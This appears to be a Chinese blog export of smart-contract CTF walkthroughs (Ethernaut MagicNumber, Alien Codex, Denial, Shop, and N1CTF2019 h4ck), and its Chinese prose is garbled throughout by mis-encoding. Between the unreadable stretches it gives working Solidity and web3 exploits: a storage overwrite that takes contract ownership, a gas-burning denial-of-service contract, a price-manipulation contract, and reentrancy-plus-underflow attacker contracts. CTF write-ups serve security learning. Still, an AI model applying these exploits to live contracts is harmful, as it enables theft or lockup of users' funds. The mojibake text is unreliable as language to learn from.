å›¾ç‰‡æ¥è‡ªäºŽhttps://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 å…ˆçœ‹ä¸€ä¸‹ contract creation æœŸé—´ä¼šå‘ç”Ÿä»€ä¹ˆï¼š1ã€é¦–å…ˆï¼Œç”¨æˆ·æˆ–åˆçº¦å°†äº¤æ˜“å‘é€åˆ°ä»¥å¤ªç½‘ç½‘ç»œã€‚æ­¤äº¤æ˜“åŒ…å«æ•°æ®ï¼Œä½†æ²¡æœ‰ to åœ°å€ï¼Œè¡¨æ˜Žè¿™æ˜¯ä¸€ä¸ªåˆçº¦åˆ›å»ºï¼Œè€Œä¸æ˜¯ä¸€ä¸ª send/call transaction2ã€å…¶æ¬¡ï¼ŒEVM å°† Solidityï¼ˆé«˜çº§è¯­è¨€ï¼‰çš„åˆçº¦ä»£ç ç¼–è¯‘ä¸º bytecodeï¼ˆåº•å±‚çš„æœºå™¨è¯­è¨€ï¼‰ï¼Œè¯¥ bytecode ç›´æŽ¥è½¬æ¢ä¸º opcodes ï¼Œåœ¨å•ä¸ªè°ƒç”¨å †æ ˆä¸­è¿è¡Œ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šcontract creation çš„ bytecode åŒ…å«ä¸¤éƒ¨åˆ†ï¼šinitialization code å’Œ runtime code 3ã€åœ¨ contract creation æœŸé—´ï¼ŒEVM ä»…æ‰§è¡Œ initialization code ç›´åˆ°åˆ°è¾¾å †æ ˆä¸­çš„ç¬¬ä¸€æ¡ STOP æˆ– RETURN æŒ‡ä»¤ï¼Œåœ¨æ­¤é˜¶æ®µï¼Œåˆçº¦çš„ constructor() ä¼šè¢«è¿è¡Œï¼Œåˆçº¦ä¾¿æœ‰åœ°å€äº† åœ¨è¿è¡Œ initialization code åŽï¼Œåªæœ‰ runtime code åœ¨å †æ ˆä¸Šï¼Œç„¶åŽå°†è¿™äº› opcode æ‹·è´ åˆ° memory å¹¶è¿”å›žåˆ° EVM 4ã€æœ€åŽï¼ŒEVM å°† runtime code è¿”å›žçš„ opcode å­˜å‚¨åœ¨ state storage ï¼Œå¹¶ä¸Žæ–°çš„åˆçº¦åœ°å€ç›¸å…³è”ï¼Œåœ¨å°†æ¥å¯¹æ–°åˆçº¦çš„è°ƒç”¨æ—¶ï¼Œè¿™äº› runtime code å°†è¢«æ‰§è¡Œ å¯¹äºŽè¯¥é¢˜ æ‰€ä»¥ä¸ºäº†è§£å†³è¯¥é¢˜ï¼Œæˆ‘ä»¬éœ€è¦ initialization opcodes å’Œ runtime codes initialization opcodes: ç”± EVM è¿è¡Œåˆ›å»ºåˆçº¦å¹¶å­˜å‚¨å°†æ¥è¦ç”¨çš„ runtime codes runtime codes: åŒ…å«æ‰€éœ€çš„å®žé™…æ‰§è¡Œé€»è¾‘ã€‚å¯¹äºŽæœ¬é¢˜æ¥è¯´ï¼Œè¿™æ˜¯åº”è¯¥è¿”å›žçš„ä»£ç çš„ä¸»è¦éƒ¨åˆ†ï¼Œåº”è¯¥ return 42 å¹¶ä¸” under 10 opcodes 1ã€å…ˆæ¥çœ‹ runtime codes : è¿”å›žå€¼ç”± return(p, s) æ“ä½œç å¤„ç†ï¼Œä½†æ˜¯åœ¨è¿”å›žå€¼ä¹‹å‰ï¼Œå¿…é¡»å…ˆå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä½¿ç”¨ mstore(p, v) å°† 42 å­˜å‚¨åœ¨å†…å­˜ä¸­ é¦–å…ˆï¼Œä½¿ç”¨ mstore(p, v) å°† 42 å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œå…¶ä¸­ p æ˜¯åœ¨å†…å­˜ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œ v æ˜¯åå…­è¿›åˆ¶å€¼ï¼Œ42 çš„åå…­è¿›åˆ¶æ˜¯ 0x2a 1230x602a ;PUSH1 0x2a v0x6080 ;PUSH1 0x80 p0x52 ;MSTORE ç„¶åŽï¼Œä½¿ç”¨ return(p, s) è¿”å›ž 0x2a ï¼Œå…¶ä¸­ p æ˜¯å€¼ 0x2a å­˜å‚¨çš„ä½ç½®ï¼Œs æ˜¯å€¼ 0x2a å­˜å‚¨æ‰€å çš„å¤§å° 0x20 ï¼Œå 32å­—èŠ‚ 1230x6020 ;PUSH1 0x20 s0x6080 ;PUSH1 0x80 p0xf3 ;RETURN æ‰€ä»¥ runtime codes åº”è¯¥æ˜¯ 602a60805260206080f3 ï¼Œæ­£å¥½ 10 opcodes 2ã€å†æ¥çœ‹ initialization codes : é¦–å…ˆï¼Œinitialization codes éœ€è¦å…ˆå°† runtime codes æ‹·è´åˆ°å†…å­˜ï¼Œç„¶åŽå†å°†å…¶è¿”å›žåˆ° EVM ã€‚å°†ä»£ç ä»Žä¸€ä¸ªåœ°æ–¹å¤åˆ¶åˆ°å¦ä¸€ä¸ªåœ°æ–¹æ˜¯ codecopy(t, f, s) æ“ä½œç ã€‚t æ˜¯ä»£ç çš„ç›®æ ‡ä½ç½®ï¼Œf æ˜¯ runtime codes çš„å½“å‰ä½ç½®ï¼Œs æ˜¯ä»£ç çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ï¼Œå¯¹äºŽ 602a60805260206080f3 å°±æ˜¯ 10 bytes 12345;copy bytecode to memory0x600a ;PUSH1 0x0a S(runtime code size)0x60?? ;PUSH1 0x?? F(current position of runtime opcodes)0x6000 ;PUSH1 0x00 T(destination memory index 0)0x39 ;CODECOPY ç„¶åŽï¼Œéœ€è¦å°†å†…å­˜ä¸­çš„ runtime codes è¿”å›žåˆ° EVM 1234;return code from memory to EVM0x600a ;PUSH1 0x0a S0x6000 ;PUSH1 0x00 P0xf3 ;RETURN initialization codes æ€»å…±å äº† 0x0c å­—èŠ‚ï¼Œè¿™è¡¨ç¤º runtime codes ä»Žç´¢å¼• 0x0c å¼€å§‹ï¼Œæ‰€ä»¥ ?? çš„åœ°æ–¹æ˜¯ 0x0c æ‰€ä»¥ï¼Œinitialization codes æœ€åŽçš„é¡ºåºæ˜¯ 600a600c600039600a6000f3 æ‰€ä»¥ï¼Œopcodesæœ€åŽçš„é¡ºåºæ˜¯ 0x600a600c600039600a6000f3602a60805260206080f3 Solution12var bytecode = "0x600a600c600039600a6000f3602a60805260206080f3";web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;); å¾—åˆ°https://ropsten.etherscan.io/tx/0x2e2a636712b37e27af795073a7be6fca9ddfdf964a2356d98c113463c69359ffï¼Œç‚¹å‡»æŸ¥çœ‹å¦‚ä¸‹ï¼Œå¾—åˆ° Contract address ä¸º 0x7baa1861df4eff11ff258e657bff2420be19b564 è°ƒç”¨é¢˜ç›®åˆçº¦ setsolver(â€œ0x7baa1861df4eff11ff258e657bff2420be19b564â€) å³å¯ Alien CodexRequire You&#39;ve uncovered an Alien contract. Claim ownership to complete the level. Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.24;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact(bytes32[] _firstContactMessage) public &#123; assert(_firstContactMessage.length &gt; 2**200); contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125;&#125; Analyse åˆçº¦å¼€å¤´ import äº† Ownable.sol åˆçº¦ï¼ŒåŒæ—¶ä¹Ÿå¼•å…¥äº†ä¸€ä¸ª owner å˜é‡ 12await web3.eth.getStorageAt(instance, 0, function(x, y) &#123;console.info(y)&#125;);// 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5 å…¶ä¸­ owner = 0x73048cec9010e92c298b016966bde1cc47299df5 ï¼Œcontract = 0x0ï¼Œè¿™æ˜¯ç”±äºŽ EVM å­˜å‚¨ä¼˜åŒ–çš„å…³ç³»ï¼Œå¯ä»¥å‚è€ƒ https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage å¹¶ä¸”æ•°ç»„ codex çš„ slot ä¸º 1 ï¼ŒåŒæ—¶è¿™ä¹Ÿæ˜¯å­˜å‚¨æ•°ç»„ length çš„åœ°æ–¹ï¼Œè€Œ codex çš„å®žé™…å†…å®¹å­˜å‚¨åœ¨ keccak256(bytes32(1)) å¼€å§‹çš„ä½ç½® Keccak256 æ˜¯ç´§å¯†æ‰“åŒ…çš„ï¼Œæ„æ€æ˜¯è¯´å‚æ•°ä¸ä¼šè¡¥ä½ï¼Œå¤šä¸ªå‚æ•°ä¹Ÿä¼šç›´æŽ¥è¿žæŽ¥åœ¨ä¸€èµ·ï¼Œæ‰€ä»¥è¦ç”¨ keccak256(bytes32(1)) å‚è€ƒ Solidityä¸­å„ç§å˜é‡çš„å­˜å‚¨æ–¹å¼ è¿™æ ·æˆ‘ä»¬å°±çŸ¥é“äº† codex å®žé™…çš„å­˜å‚¨çš„ slot ï¼Œå¯ä»¥å°†åŠ¨æ€æ•°ç»„å†…å˜é‡çš„å­˜å‚¨ä½è®¡ç®—æ–¹æ³•æ¦‚æ‹¬ä¸º: array[array_slot_index] == SLOAD(keccak256(slot(array)) + slot_index). å› ä¸ºæ€»å…±æœ‰ 2^256 ä¸ª slot ï¼Œè¦ä¿®æ”¹ slot 0 ï¼Œå‡è®¾ codex å®žé™…æ‰€åœ¨ slot x ï¼Œ(å¯¹äºŽæœ¬é¢˜æ¥è¯´ï¼Œæ•°ç»„çš„ slotæ˜¯ 1 , x=keccak256(bytes32(1))) ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¿®æ”¹ codex[y],(y=2^256-x+0) æ—¶å°±èƒ½ä¿®æ”¹ slot 0 ï¼Œä»Žè€Œä¿®æ”¹ owner æˆ‘ä»¬è¦ä¿®æ”¹ codex[y] ï¼Œé‚£å°±è¦æ»¡è¶³ y &lt; codex.length ï¼Œè€Œè¿™ä¸ªæ—¶å€™ codex.length =0 ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ retract() ä½¿ length ä¸‹æº¢ï¼Œç„¶åŽå°±å¯ä»¥æ“çºµ codex[y] äº† 123await web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;);// codex.length// 0x0000000000000000000000000000000000000000000000000000000000000000 ä½†æ˜¯æ— è®ºè°ƒç”¨é¢˜ç›®åˆçº¦å“ªä¸ªå‡½æ•°ï¼Œéƒ½è¦æ»¡è¶³ modifier contacted() ï¼Œæ‰€ä»¥è¦å…ˆä½¿ contact=true ï¼Œä¹Ÿå°±æ˜¯è¦å…ˆè§£å†³ make_contact è¿™ä¸ªé—®é¢˜ Solution1ã€å…ˆçœ‹ make_contact å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦ä¼ äººä¸€ä¸ª length&gt;2^200 çš„æ•°ç»„ï¼ŒOPCODE ä¸­æ•°ç»„é•¿åº¦æ˜¯å­˜å‚¨åœ¨æŸä¸ª slot ä¸Šçš„ï¼Œå¹¶ä¸”æ²¡æœ‰å¯¹æ•°ç»„é•¿åº¦å’Œæ•°ç»„å†…çš„æ•°æ®åšæ ¡éªŒï¼Œæ‰€ä»¥å¯ä»¥æž„é€ ä¸€ä¸ªå­˜å‚¨ä½ä¸Šé•¿åº¦å¾ˆå¤§ï¼Œä½†å®žé™…ä¸Šå¹¶æ²¡æœ‰æ•°æ®çš„æ•°ç»„ï¼Œæ‰“åŒ…æˆ data å‘é€123456789101112sig = web3.sha3("make_contact(bytes32[])").slice(0,10) // å‡½æ•°id// "0x1d3d4c0b"data1 = "0000000000000000000000000000000000000000000000000000000000000020" //åç§»ï¼ŒæŒ‡çš„æ˜¯é™¤äº†å‡½æ•°idï¼Œæ•°ç»„å†…å®¹å¼€å§‹çš„ä½ç½®ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬è®¾ç½®çš„æ˜¯offset=32// é™¤åŽ»å‡½æ•°é€‰æ‹©å™¨ï¼Œæ•°ç»„é•¿åº¦çš„å­˜å‚¨ä»Žç¬¬ 0x20 ä½å¼€å§‹data2 = "1000000000000000000000000000000000000000000000000000000000000001" //length&gt;2^200// æ•°ç»„çš„é•¿åº¦await contract.contact()// falsecontract.sendTransaction(&#123;data: sig + data1 + data2&#125;);// å‘é€äº¤æ˜“await contract.contact()// true 2ã€è®¡ç®— codex ä½ç½®ä¸º slot 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 æ‰€ä»¥ y = 2^256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 + 0 å³ y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 123456789pragma solidity ^0.4.24;contract codex &#123; function cal() view returns(bytes32)&#123; return keccak256((bytes32(1))); &#125; &#125; 3ã€å¯ä»¥çœ‹åˆ° y = 35707666377435648211887908874984608119992236509074197713628505308453184860938 å¾ˆå¤§ï¼Œè€Œ codex.length=0(è§Analyse) å¾ˆå°ï¼Œæˆ‘ä»¬é€šè¿‡ retract() ä½¿å¾— codex æ•°ç»„ length ä¸‹æº¢ï¼Œä½¿å…¶æ»¡è¶³ y &lt; codex.length12345678web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;); // codex.length// 0x0000000000000000000000000000000000000000000000000000000000000000contract.retract()// codex.length--web3.eth.getStorageAt(instance, 1, function(x, y) &#123;console.info(y)&#125;); // codex.length// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 4ã€ç”±2å’Œ3å·²ç»è®¡ç®—å‡º codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] å¯¹åº”çš„å­˜å‚¨ä½å°±æ˜¯ slot 0 ï¼Œåœ¨ Analyse ä¸­æåˆ° slot 0 ä¸­åŒæ—¶å­˜å‚¨äº† contact å’Œ owner ï¼Œæˆ‘ä»¬åªéœ€å°† owner æ¢æˆ player åœ°å€å³å¯123456789await contract.owner()// "0x73048cec9010e92c298b016966bde1cc47299df5"player// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"contract.revise('35707666377435648211887908874984608119992236509074197713628505308453184860938','0x00000000000000000000000088d3052d12527f1fbe3a6e1444ea72c4ddb396c2')// è°ƒç”¨ revise()await contract.owner()// "0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2"// Submit instance DenialRequire This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner. If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level. ç»“åˆä»£ç çœ‹äº†ä¸€ä¸‹ï¼Œè¦æ±‚å°±æ˜¯åœ¨è°ƒç”¨ withdraw æ—¶ï¼Œç¦æ­¢ owner è½¬èµ°è´¦æˆ·çš„ 1% çš„ä½™é¢ Source123456789101112131415161718192021222324252627282930313233343536pragma solidity ^0.4.24;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Denial &#123; using SafeMath for uint256; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance.div(100); // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend); &#125; // allow deposit of funds function() payable &#123;&#125; // convenience function function contractBalance() view returns (uint) &#123; return address(this).balance; &#125;&#125; Analyse å¯ä»¥ä½¿ transfer å¤±è´¥ï¼Œä¹Ÿå°±æ˜¯æŠŠ gas è€—å…‰ ä½¿ç”¨ assert å¤±è´¥çš„è¯ï¼Œå°†ä¼š spend all gas ï¼Œè¿™æ ·çš„è¯ owner.transfer(amountToSend) å°†æ‰§è¡Œå¤±è´¥ è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¾ˆæ˜Žæ˜¾çš„é‡å…¥æ¼æ´ž partner.call.value(amountToSend)() ï¼Œåˆ©ç”¨é‡å…¥æ¼æ´žæŠŠ gas æ¶ˆè€—å®Œï¼Œåº”è¯¥ä¹Ÿå¯ä»¥è¾¾åˆ°ç›®çš„ï¼ˆè‡ªè¡Œå°è¯•ï¼‰ Solution1234567891011121314151617181920212223242526272829303132333435363738394041424344454647pragma solidity ^0.4.24;contract Denial &#123; address public partner; // withdrawal partner - pay the gas, split the withdraw address public constant owner = 0xA9E; uint timeLastWithdrawn; mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances function setWithdrawPartner(address _partner) public &#123; partner = _partner; &#125; // withdraw 1% to recipient and 1% to owner function withdraw() public &#123; uint amountToSend = address(this).balance/100; // perform a call without checking return // The recipient can revert, the owner will still get their share partner.call.value(amountToSend)(); owner.transfer(amountToSend); // keep track of last withdrawal time timeLastWithdrawn = now; withdrawPartnerBalances[partner] += amountToSend; &#125; // allow deposit of funds function() payable &#123;&#125; // convenience function function contractBalance() view returns (uint) &#123; return address(this).balance; &#125;&#125;contract hack &#123; address instance_address = 0xe6cdb72d9fec660b78eb2390ffa67ab61b766e51; Denial target = Denial(instance_address); function hack1() public &#123; target.setWithdrawPartner(address(this)); target.withdraw(); &#125; function() payable &#123; assert(0==1); &#125;&#125; ç›´æŽ¥è°ƒç”¨ hack1() å³å¯ ShopRequire é¢˜ç›®æ„æ€æ˜¯ä¿®æ”¹ price å°äºŽ 100 ï¼ˆä¸è¿‡è¿™ä¸ªé¢˜ç›®å¥½åƒä¸‹çº¿äº†23333ï¼‰ Source12345678910111213141516171819pragma solidity 0.4.24;interface Buyer &#123; function price() external view returns (uint);&#125;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price.gas(3000)(); &#125; &#125;&#125; Analyse æœ¬æ¥æƒ³çš„æ˜¯åˆ©ç”¨ storage ä¿®æ”¹ï¼Œå¯æ˜¯ä¿®æ”¹å˜é‡éœ€è¦ 5000 gasï¼Œä½†æ˜¯æˆ‘ä»¬åªæœ‰ 3000 æ‰€ä»¥éœ€è¦å¦æƒ³åŠžæ³•ï¼Œå‘çŽ° isSold æ˜¯ public å±žæ€§ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ isSold ï¼Œæ ¹æ® isSold è¿›è¡Œåˆ¤æ–­ï¼Œä¸¤æ¬¡è°ƒç”¨ _buyer.price.gas(3000)() ç¬¬ä¸€æ¬¡è¿”å›žå¤§äºŽç­‰äºŽ 100 ï¼Œç¬¬äºŒæ¬¡è¿”å›žå°äºŽ 100 å³å¯ Solution12345678910111213141516171819202122232425262728pragma solidity 0.4.24;contract Shop &#123; uint public price = 100; bool public isSold; function buy() public &#123; Buyer _buyer = Buyer(msg.sender); if (_buyer.price.gas(3000)() &gt;= price &amp;&amp; !isSold) &#123; isSold = true; price = _buyer.price.gas(3000)(); &#125; &#125;&#125;contract Buyer &#123; address instance_address = instance_address_here; Shop target = Shop(instance_address); function price() external view returns (uint)&#123; return Shop(msg.sender).isSold() == true ? 99 : 100; &#125; function attack() public &#123; target.buy(); &#125;&#125; ç›´æŽ¥è°ƒç”¨ attack() å³å¯ Referencehttp://mitah.cn/index.php/archives/14/https://f3real.github.io/Ethernaut_wargame2022.html#lvl-21-denialhttps://www.codercto.com/a/38161.htmlhttps://www.secpulse.com/archives/73682.htmlhttps://www.anquanke.com/post/id/148341#h2-12https://xz.aliyun.com/t/2856#toc-4https://blog.riskivy.com/æ™ºèƒ½åˆçº¦ctfï¼šethernaut-writeup-part-4/https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>Smart Contract</tag>
        <tag>Ethernaut</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[N1CTF2019 h4ck]]></title>
    <url>%2F2019%2Fh4ck%2F</url>
    <content type="text"><![CDATA[å‰è¨€å‰æ®µæ—¶é—´å‚åŠ äº†ä¸€ä¸‹N1CTF2019ï¼ˆä½œä¸ºå°ç™½å‚åŠ ï¼‰ï¼Œå¾ˆå¹¸è¿åšå‡ºä¸€é“Smart Contractçš„é¢˜ç›®ï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹ï¼Œåˆçº¦åœ°å€å¦‚ä¸‹ï¼šhttps://kovan.etherscan.io/address/0xe2d6d8808087d2e30eadf0acb67708148dbee0c0 Contract Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142/** *Submitted for verification at Etherscan.io on 2019-09-07*//** *Submitted for verification at Etherscan.io on 2019-05-31*/pragma solidity ^0.4.25;contract owned &#123; address public owner; constructor () public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address newOwner) public onlyOwner &#123; owner = newOwner; &#125;&#125;contract challenge is owned&#123; string public name; string public symbol; uint8 public decimals = 18; uint256 public totalSupply; mapping (address =&gt; uint256) public balanceOf; mapping (address =&gt; uint256) public sellTimes; mapping (address =&gt; mapping (address =&gt; uint256)) public allowance; mapping (address =&gt; bool) public winner; event Transfer(address _from, address _to, uint256 _value); event Burn(address _from, uint256 _value); event Win(address _address,bool _win); constructor ( uint256 initialSupply, string tokenName, string tokenSymbol ) public &#123; totalSupply = initialSupply * 10 ** uint256(decimals); balanceOf[msg.sender] = totalSupply; name = tokenName; symbol = tokenSymbol; &#125; function _transfer(address _from, address _to, uint _value) internal &#123; require(_to != address(0x0)); require(_value &gt; 0); uint256 oldFromBalance = balanceOf[_from]; uint256 oldToBalance = balanceOf[_to]; uint256 newFromBalance = balanceOf[_from] - _value; uint256 newToBalance = balanceOf[_to] + _value; require(oldFromBalance &gt;= _value); require(newToBalance &gt; oldToBalance); balanceOf[_from] = newFromBalance; balanceOf[_to] = newToBalance; assert((oldFromBalance + oldToBalance) == (newFromBalance + newToBalance)); emit Transfer(_from, _to, _value); &#125; function transfer(address _to, uint256 _value) public returns (bool success) &#123; _transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) &#123; require(_value &lt;= allowance[_from][msg.sender]); allowance[_from][msg.sender] -= _value; _transfer(_from, _to, _value); return true; &#125; function approve(address _spender, uint256 _value) public returns (bool success) &#123; allowance[msg.sender][_spender] = _value; return true; &#125; function burn(uint256 _value) public returns (bool success) &#123; require(balanceOf[msg.sender] &gt;= _value); balanceOf[msg.sender] -= _value; totalSupply -= _value; emit Burn(msg.sender, _value); return true; &#125; function balanceOf(address _address) public view returns (uint256 balance) &#123; return balanceOf[_address]; &#125; function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true; &#125; function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true; &#125; function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true; &#125; function kill(address _address) public onlyOwner &#123; selfdestruct(_address); &#125; function eth_balance() public view returns (uint256 ethBalance)&#123; return address(this).balance; &#125; &#125; åˆ†æž é¢˜ç›®çš„è¦æ±‚æ˜¯execute the winnerSubmit function 1234567function winnerSubmit() public returns (bool success)&#123; require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); winner[msg.sender] = true; emit Win(msg.sender,true); return true;&#125; è¿™é‡Œæœ‰ä¸¤ä¸ªrequireï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªrequireå¾ˆå®¹æ˜“æ»¡è¶³ï¼Œåˆ›å»ºwinnerçš„æ—¶å€™é»˜è®¤å…¨ä¸ºfalseï¼Œæ‰€ä»¥åªè¦æ»¡è¶³ç¬¬äºŒä¸ªrequireå³å¯ require(winner[msg.sender] == false); require(sellTimes[msg.sender] &gt; 100); é˜…è¯»åˆçº¦ä»£ç ï¼Œå‘çŽ°sellå‡½æ•°ï¼Œè¿™é‡Œçš„msg.sender.call.value(_amount)()å­˜åœ¨Reentrancyæ¼æ´ž,åŒæ—¶å¯ä»¥ä½¿å¾—sellTimes[msg.sender] -= 1,å¦‚æžœèƒ½äº§ç”Ÿä¸‹æº¢å°±è¡Œäº†ï¼Œæ‰€ä»¥éœ€è¦æ‰¾ä¸€ä¸‹åˆå§‹åŒ–sellTimes[msg.sender]çš„åœ°æ–¹ï¼Œä½†æ˜¯è¿™é‡Œæœ‰4ä¸ªrequireï¼š ç¬¬ä¸€ä¸ªrequireå¾ˆå®¹æ˜“æ»¡è¶³ ç¬¬äºŒä¸ªrequireå¯ä»¥çœ‹ä¸‹é¢çš„buyå‡½æ•°åˆ†æž ç¬¬ä¸‰ä¸ªrequireå¯ä»¥ä½¿ç”¨è–…ç¾Šæ¯›æ”»å‡»æ–¹æ³•ï¼Œä½¿å¾—balanceOf[msg.sender]è¾¾åˆ°æŒ‡å®šæ•°é¢ ç¬¬å››ä¸ªrequireè‡ªåŠ¨æ»¡è¶³ï¼Œaddress(this).balanceç»™çš„å¾ˆå¤§12345678910function sell(uint256 _amount) public returns (bool success)&#123; require(_amount &gt;= 100); require(sellTimes[msg.sender] &gt; 0); require(balanceOf[msg.sender] &gt;= _amount); require(address(this).balance &gt;= _amount); msg.sender.call.value(_amount)(); _transfer(msg.sender, address(this), _amount); sellTimes[msg.sender] -= 1; return true;&#125; æ‰¾åˆ°äº†buyå‡½æ•°ï¼Œå¯ä»¥ä½¿å¾—sellTimes[msg.sender] = 1ï¼Œè¿™é‡Œæœ‰ä¸¤ä¸ªrequireï¼Œç¬¬ä¸€ä¸ªå¾ˆå®¹æ˜“æ»¡è¶³ï¼Œé»˜è®¤å°±æ˜¯0ï¼Œæ‰€ä»¥åªè¦msg.value == 1 weiå³å¯ï¼Œè¿™æ ·çš„è¯buyå‡½æ•°å°±å¯ä»¥æ”¹å˜sellTimes[msg.sender]ä¸º1äº† 1234567function buy() payable public returns (bool success)&#123; require(balanceOf[msg.sender]==0); require(msg.value == 1 wei); _transfer(address(this), msg.sender, 1); sellTimes[msg.sender] = 1; return true;&#125; è¿™æ ·çš„è¯ï¼Œå¦‚æžœåˆ©ç”¨buyå‡½æ•°å…ˆä½¿å¾—sellTimes[msg.sender]=1ï¼Œç„¶åŽè°ƒç”¨sellå‡½æ•°åˆ©ç”¨Reentrancyæ¼æ´žé‡å…¥æ”»å‡»ä¸¤æ¬¡çš„è¯ï¼ŒsellTimes[msg.sender]æ˜¯uint256ç±»åž‹ï¼Œè¿žç»­ä¸¤æ¬¡å‡1å¯ä»¥ä¸‹æº¢ï¼Œè¿œè¿œå¤§äºŽ100ï¼Œä¾¿å¯æ»¡è¶³winnerSubmitä¸­çš„ç¬¬äºŒä¸ªrequireï¼Œæ”»å‡»æˆåŠŸ éƒ¨ç½²æ”»å‡»åˆçº¦æ”»å‡»åˆçº¦ä»£ç è¿™é‡Œéƒ¨ç½²äº†ä¸¤ä¸ªåˆçº¦ï¼ˆä¸è¦åœ¨æ„å‘½åäº†23333ï¼‰ï¼Œhackeræ˜¯æ”»å‡»åˆçº¦ï¼Œhacker1æ˜¯è¾…åŠ©åˆçº¦ï¼Œç”¨æ¥å®Œæˆè–…ç¾Šæ¯›è½¬è´¦ç”¨åˆ°çš„ï¼Œ æ³¨æ„åœ¨éƒ¨ç½²hackerçš„åŒæ—¶è½¬è´¦1 weiï¼Œç›®çš„æ˜¯è°ƒç”¨åŽé¢çš„buyå‡½æ•° éƒ¨ç½²hacker1çš„åŒæ—¶è½¬è´¦200 weiï¼Œç›®çš„æ˜¯å®ŒæˆåŽé¢è–…ç¾Šæ¯›è½¬è´¦ï¼Œè‹¥amount=100 weiï¼Œåˆ™å¯ä»¥Reentrancyæ”»å‡»ä¸¤æ¬¡ï¼Œå®Œæˆæ”»å‡»1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253contract hacker &#123; address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0; challenge target = challenge(instance_address); function hacker() payable &#123;&#125; function hack1()&#123; target.buy.value(1)(); &#125; function hack4()&#123; target.sell(uint(100)); &#125; function get() public view returns (uint256 balance) &#123; return address(this).balance; &#125; function hack5()&#123; target.winnerSubmit(); &#125; function() public payable &#123; target.sell(uint(100)); &#125; &#125;contract hacker1 &#123; address instance_address = 0xe2d6d8808087d2e30eadf0acb67708148dbee0c0; challenge target = challenge(instance_address); function hacker1() payable &#123;&#125; function hack1()&#123; target.buy.value(1)(); &#125; function hack2()&#123; target.transfer(address(0x5ebec5286e74362613a5e6e8e3bb90df408fe2a7), 1); &#125; function hack3()&#123; for(uint i = 0; i&lt;100; i++)&#123; hack1(); hack2(); &#125; &#125; function get() public view returns (uint256 balance) &#123; return address(this).balance; &#125;&#125; 